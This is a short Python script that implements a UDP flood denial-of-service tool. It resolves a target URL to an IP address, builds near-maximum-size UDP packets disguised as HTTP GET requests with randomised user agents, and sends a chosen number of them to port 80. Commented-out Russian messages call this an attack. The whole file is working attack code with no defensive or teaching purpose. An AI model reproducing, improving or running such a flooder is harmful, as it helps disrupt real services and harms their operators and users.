import socket
import random
from fake_useragent import UserAgent  

ua = UserAgent()

MAX_UDP_SIZE = 65507

def get_ip_from_url(url):
    try:
        hostname = url.replace("https://", "").replace("http://", "").split('/')[0]
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except socket.gaierror:
        return None

def generate_http_packet(packet_size):
    user_agent = ua.random  
    http_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: example.com\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        f"Accept-Language: en-US,en;q=0.5\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )

    if packet_size > MAX_UDP_SIZE:
        packet_size = MAX_UDP_SIZE

    while len(http_request) < packet_size:
        http_request += "X" * min(1024, packet_size - len(http_request))
    return http_request.encode("utf-8")  

def udp_flood(target_url, packet_size_mb, num_packets):
    target_ip = get_ip_from_url(target_url)
    if not target_ip:
        # print(f"Ошибка: Не удалось получить IP-адрес для {target_url}")
        return 0, 0  

    target_port = 80  
    packet_size = min(packet_size_mb * 1024 * 1024, MAX_UDP_SIZE)
    sent_bytes = 0  
    iterations = 0  

    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # print(f"Атака на {target_ip}:{target_port} началась! Размер пакета: {packet_size / 1024:.2f} KB, количество пакетов: {num_packets}.")

    for _ in range(num_packets):
        data = generate_http_packet(packet_size)  
        client.sendto(data, (target_ip, target_port))
        sent_bytes += len(data)
        iterations += 1  

    # print(f"Атака завершена! Отправлено: {sent_bytes / (1024 * 1024):.2f} MB, итераций: {iterations}")
    return iterations, sent_bytes
